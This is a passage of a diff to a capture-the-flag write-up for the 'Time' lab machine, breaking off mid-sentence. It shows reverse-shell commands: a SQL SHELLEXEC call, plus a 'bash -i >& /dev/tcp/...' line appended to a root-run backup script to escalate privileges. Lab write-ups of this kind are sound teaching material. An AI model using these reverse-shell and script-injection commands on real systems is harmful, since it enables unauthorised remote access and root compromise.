@@ -103,7 +103,24 @@ CALL SHELLEXEC('bash -i &>/dev/tcp/10.10.16.11/1234 0>&1 &')
 
 ![](https://i.ibb.co/hfJzCL3/image.png)
 
-**I found that intersting file to check ``` /usr/bin/timer_backup.sh ```
+**I found that intersting file to check ``` /usr/bin/timer_backup.sh ```**
+
+```bash
+pericles@time:/usr/bin$ cat timer_backup.sh
+cat timer_backup.sh
+#!/bin/bash
+zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
+```
+> **It's create a zip archive from /var/www/html and moving it to /root/backup.zip**
+
+> **So we have two ways to solve this situation, First add our public key to the authorized keys for root in Time Box and connect via ssh, but NO TIME so i choosed the second choice by getting reverse shell via bash shell ```echo "bash -i >& /dev/tcp/YOUR_MACHINE_IP/YOUR_NC_LISTNER_PORT 0>&1" >>/usr/bin/timer_backup.sh.**
+
+```bash
+pericles@time:/usr/bin$ echo "bash -i >& /dev/tcp/10.10.16.11/4321 0>&1" >>/usr/bin/timer_backup.sh
+<p/10.10.16.11/4321 0>&1" >>/usr/bin/timer_backup.sh
+```
+**Till Now it's OK and you will get reverse shell to your listner, But for ONLY 5 seconds i think and that is the idea of TIME box, So you have to be very fast to cat your 
+
 
 
 ![]()
